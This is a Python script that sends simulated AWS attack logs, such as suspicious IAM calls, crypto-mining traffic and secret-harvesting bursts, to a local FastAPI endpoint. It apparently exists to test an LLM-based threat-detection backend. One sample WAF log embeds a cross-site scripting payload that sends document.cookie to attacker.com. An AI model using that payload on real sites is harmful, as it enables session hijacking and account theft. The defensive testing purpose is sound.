import requests
import time
import random
from datetime import datetime, timezone

# Your FastAPI endpoint
API_URL = "http://127.0.0.1:8000/api/v1/logs"

# Advanced Cloud Attack Scenarios
ATTACK_SCENARIOS = [
    {
        "source": "AWS_CLOUDTRAIL",
        "log_content": '{"event": "GetCallerIdentity spam and DescribeInstances from newly created IAM User", "user": "temp-backup-admin", "ip": "45.129.2.17"}'
    },
    {
        "source": "AWS_GUARDDUTY",
        "log_content": '{"event": "EC2 instance i-0abcd1234efgh5678 is querying known Bitcoin mining pools on port 8333", "ip": "10.0.1.55"}'
    },
    {
        "source": "AWS_CLOUDTRAIL",
        "log_content": '{"event": "ModifyDBInstance: altoro-prod-db publiclyAccessible flag set to TRUE", "user": "dev-ops-role", "ip": "185.220.101.45"}'
    },
    {
        "source": "AWS_CLOUDTRAIL",
        "log_content": '{"event": "GetSecretValue called 50 times in 1 minute on prod/db/credentials", "role": "lambda-edge-worker", "ip": "10.0.2.12"}'
    },
    {
        "source": "AWS_WAF",
        "log_content": '{"event": "POST /api/checkout payload: <script>fetch(\'http://attacker.com/steal?c=\'+document.cookie)</script>", "ip": "192.168.1.100"}'
    },
    # Keep some routine traffic so Groq can still prove it filters noise
    {
        "source": "AWS_VPC_FLOW",
        "log_content": '{"event": "Health check ping from ALB to EC2 target group", "ip": "10.0.0.5"}'
    }
]

def send_telemetry():
    print("🚀 Starting Advanced AWS Threat Spoofer...")
    while True:
        payload = random.choice(ATTACK_SCENARIOS)
        data = {
            "source": payload["source"],
            "log_content": payload["log_content"],
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        
        try:
            response = requests.post(API_URL, json=data)
            print(f"[{data['source']}] Sent -> Backend Status: {response.status_code}")
        except Exception as e:
            print(f"❌ Connection error: Is your uvicorn server running? ({e})")
            
        time.sleep(random.uniform(2.0, 5.0)) # Randomize the timing for realism

if __name__ == "__main__":
    send_telemetry()